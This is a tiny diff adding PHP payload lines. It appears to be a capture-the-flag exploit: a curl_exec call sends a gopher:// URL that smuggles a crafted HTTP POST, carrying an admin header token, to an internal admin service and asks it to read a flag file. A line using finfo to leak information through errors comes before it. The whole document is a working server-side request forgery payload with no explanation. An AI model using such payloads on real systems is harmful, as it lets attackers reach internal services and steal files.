@@ -1,0 +1,3 @@
+error_reporting(8)/new finfo(0,"/")
+
+curl_exec(curl_init("gopher://admin:5000/_POST%20%2Fadmin_gan%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A5000%0AX-Admin%3A%20t45dasqasfirkiww%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AContent-Length%3A%2032%0A%0Aaction%3D2%26value%3D%2Fflag_for_you.txt"))
